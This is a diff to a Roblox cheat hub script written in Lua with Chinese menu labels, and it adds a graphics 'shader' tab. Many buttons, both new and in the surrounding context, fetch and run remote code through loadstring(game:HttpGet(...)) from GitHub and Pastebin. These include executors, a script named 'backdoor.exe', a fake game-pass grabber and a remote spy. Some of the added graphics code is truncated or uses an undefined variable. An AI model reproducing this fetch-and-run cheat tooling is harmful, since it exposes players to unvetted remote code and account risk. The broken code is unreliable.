@@ -201,7 +201,7 @@ local MainTab = WazureGui:MakeTab("信息")
 local xgoTab = WazureGui:MakeTab("关于作者")
 local xgo1Tab = WazureGui:MakeTab("小go音乐区")
 local xgo2Tab = WazureGui:MakeTab("注入器及管理员")
-local xgo3Tab = WazureGui:MakeTab("小go音乐区")
+local xgo3Tab = WazureGui:MakeTab("图像 画质")
 local xgo4Tab = WazureGui:MakeTab("小go音乐区")
 local xgo5Tab = WazureGui:MakeTab("小go音乐区")
 local xgo6Tab = WazureGui:MakeTab("小go音乐区")
@@ -414,6 +414,7 @@ local Button = xgo1Tab:MakeButton("Button", {	["Title"]  ="约翰的笑声",    
 local Button = xgo1Tab:MakeButton("Button", {	["Title"]  ="他是免费的",     ["Content"] ="音乐id:130771265", ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()   local sound = Instance.new("Sound")    sound.SoundId = "rbxassetid://130771265"    sound.Parent = game.Workspace    sound:Play()    end})
 local Button = xgo1Tab:MakeButton("Button", {	["Title"]  ="李·罗伊·詹金斯",     ["Content"] ="音乐id:130758889", ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()   local sound = Instance.new("Sound")    sound.SoundId = "rbxassetid://130758889"    sound.Parent = game.Workspace    sound:Play()    end})
 local Button = xgo1Tab:MakeButton("Button", {	["Title"]  ="防空警报",     ["Content"] ="音乐id:792323017",  ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()  local sound = Instance.new("Sound")    sound.SoundId = "rbxassetid://792323017"    sound.Parent = game.Workspace    sound:Play()    end}) 
+local Seperator = xgo2Tab:MakeSeperator("注入器及管理员收藏 xxxxgo")
 local Button = xgo2Tab:MakeButton("Button", {	["Title"]  ="阿尔宙斯",   ["Content"] ="二宙斯内置版",  ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()  loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()    end})
 local Button = xgo2Tab:MakeButton("Button", {	["Title"]  ="SOROLAZ BETTER SORALA注入器",      ["Content"] ="注入器",   ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()    loadstring(game:HttpGet("https://raw.githubusercontent.com/PHNKSC/soralaz/refs/heads/main/better%20sorolaz"))()    end})
 local Button = xgo2Tab:MakeButton("Button", {	["Title"]  ="管理员注入 暂时无法使用，可能会被踢出去",      ["Content"] ="注入器",   ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()   loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()    end})
@@ -421,6 +422,128 @@ local Button = xgo2Tab:MakeButton("Button", {	["Title"]  ="xgo 普通执行",  [
 local Button = xgo2Tab:MakeButton("Button", {	["Title"]  ="管理员权限 可获得游戏内的通行证",      ["Content"] ="假的获取通行证",   ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()    loadstring(game:HttpGet("https://raw.githubusercontent.com/lIlIlIlIlI24568/114514.IIjjjjiiiallloiia.xxxxg/refs/heads/main/%E5%B0%8Fgo%E6%B1%89%E5%8C%96%E7%AE%A1%E7%90%86%E5%91%98"))()   end})
 local Button = xgo2Tab:MakeButton("Button", {	["Title"]  = "资源管理器",    ["Content"] ="管理员",   ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()  loadstring(game:HttpGet("https://raw.githubusercontent.com/VateqS/MinionHub/refs/heads/main/solara_dex"))()   end})
 local Button = xgo2Tab:MakeButton("Button", {	["Title"]  = "远程监控",	   ["Content"] ="管理员",   ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()   loadstring(game:HttpGet("https://raw.githubusercontent.com/VateqS/MinionHub/refs/heads/main/remotespy_save"))()  end})
+local Seperator = xgo3Tab:MakeSeperator("图像画质修改")
+local Button = xgo3Tab:MakeButton("Button", {	["Title"]  ="美丽天空",    ["Content"] ="修改天空图像",   ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()    local light = game.Lighting      for i, v in pairs(light:GetChildren()) do      v:Destroy()    end
+local ter = workspace.Terrain
+local color = Instance.new("ColorCorrectionEffect")
+local bloom = Instance.new("BloomEffect")
+local sun = Instance.new("SunRaysEffect")
+local blur = Inst  end})
+local Button = xgo3Tab:MakeButton("Button", {	["Title"]  = "光影（浅）",	 ["Content"] ="光影修改较浅",   ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()      	loadstring(game:HttpGet("https://pastebin.com/raw/jHBfJYmS"))()  	end})
+local Button = xgo3Tab:MakeButton("Button", {	["Title"]  ="光影菜单  小go推荐",     ["Content"] ="加载较慢，请稍等点击一下就行",   ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Shader-RTX-New-12425"))()    end})
+local Button = xgo3Tab:MakeButton("Button", {	["Title"]  ="光影v2",     ["Content"] ="光影修改",   ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()   loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()    end})
+local Button = xgo3Tab:MakeButton("Button", {	["Title"]  ="光影v4",     ["Content"] ="光影修改",   ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()    loadstring(game:HttpGet('https://pastebin.com/raw/gUceVJig'))()   end})
+local Button = xgo3Tab:MakeButton("Button", {	["Title"]  ="RTX  图形画质",     ["Content"] ="画质修改",   ["Logo"] = "rbxassetid://18923878915",	["Callback"] = function()     local light = game.Lighting        for i, v in pairs(light:GetChildren()) do        v:Destroy()         end
+local ter = workspace.Terrain
+local color = Instance.new("ColorCorrectionEffect")
+local bloom = Instance.new("BloomEffect")
+local sun = Instance.new("SunRaysEffect")
+local blur = Instance.new("BlurEffect")              color.Parent = light            bloom.Parent = light            sun.Parent = light           blur.Parent = light
+local config = { Terrain = true,              ColorCorrection = true,               Sun = true,                Lighting = true,                BloomEffect = true  }
+ --settings {
+color.Enabled = false
+color.Contrast = 0.15
+color.Brightness = 0.1
+color.Saturation = 0.25
+color.TintColor = Color3.fromRGB(255, 222, 211)
+bloom.Enabled = false
+bloom.Intensity = 0.1
+sun.Enabled = false
+sun.Intensity = 0.2
+sun.Spread = 1
+bloom.Enabled = false
+bloom.Intensity = 0.05
+bloom.Size = 32
+bloom.Threshold = 1
+blur.Enabled = false
+blur.Size = 6
+--settings }
+if config.ColorCorrection then
+color.Enabled = true           end
+if config.Sun then
+sun.Enabled = true       end
+if config.Terrain then
+--settings {
+ter.WaterWaveSize = 0.1
+ter.WaterWaveSpeed = 22
+ter.WaterTransparency = 0.9
+ter.WaterReflectance = 0.05
+--settings }
+end
+if config.Lighting then
+-- settings {
+light.Ambient = Color3.fromRGB(0, 0, 0)
+light.Brightness = 4
+light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
+light.ExposureCompensation = 0
+light.FogColor = Color3.fromRGB(132, 132, 132)
+light.GlobalShadows = true
+light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
+light.Outlines = false
+--settings }
+end
+local a = game.Lighting
+a.Ambient = Color3.fromRGB(33, 33, 33)
+a.Brightness = 5.69
+a.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+a.ColorShift_Top = Color3.fromRGB(255, 247, 237)
+a.EnvironmentDiffuseScale = 0.105
+a.EnvironmentSpecularScale = 0.522
+a.GlobalShadows = true
+a.OutdoorAmbient = Color3.fromRGB(51, 54, 67)
+a.ShadowSoftness = 0.18
+a.GeographicLatitude = -15.525
+a.ExposureCompensation = 0.75
+b.Enabled = true
+b.Intensity = 0.99
+b.Size = 9999
+b.Threshold = 0
+local c = Instance.new("ColorCorrectionEffect", a)
+c.Brightness = 0.015
+c.Contrast = 0.25
+c.Enabled = true
+c.Saturation = 0.2
+c.TintColor = Color3.fromRGB(217, 145, 57)
+if getgenv().mode == "Summer" then
+c.TintColor = Color3.fromRGB(255, 220, 148)
+elseif getgenv().mode == "Autumn" then
+c.TintColor = Color3.fromRGB(217, 145, 57)
+else
+warn("没选择模式！  xgo")
+print("请选择一种模式")
+b:Destroy()
+c:Destroy()
+end
+local d = Instance.new("DepthOfFieldEffect", a)
+d.Enabled = true
+d.FarIntensity = 0.077
+d.FocusDistance = 21.54
+d.InFocusRadius = 20.77
+d.NearIntensity = 0.277
+local e = Instance.new("ColorCorrectionEffect", a)
+e.Brightness = 0
+e.Contrast = -0.07
+e.Saturation = 0
+e.Enabled = true
+e.TintColor = Color3.fromRGB(255, 247, 239)
+local e2 = Instance.new("ColorCorrectionEffect", a)
+e2.Brightness = 0.2
+e2.Contrast = 0.45
+e2.Saturation = -0.1
+e2.Enabled = true
+e2.TintColor = Color3.fromRGB(255, 255, 255)
+local s = Instance.new("SunRaysEffect", a)
+s.Enabled = true
+s.Intensity = 0.01
+s.Spread = 0.146
+print("小go  RTX图形加载完毕!")    end})
+
+
+
+
+
+
 local TextInput = MainTab:MakeTextInput("Text Input", {
 	["Title"] = "Webhook",
 	["Content"] = "Enter your webhook here",
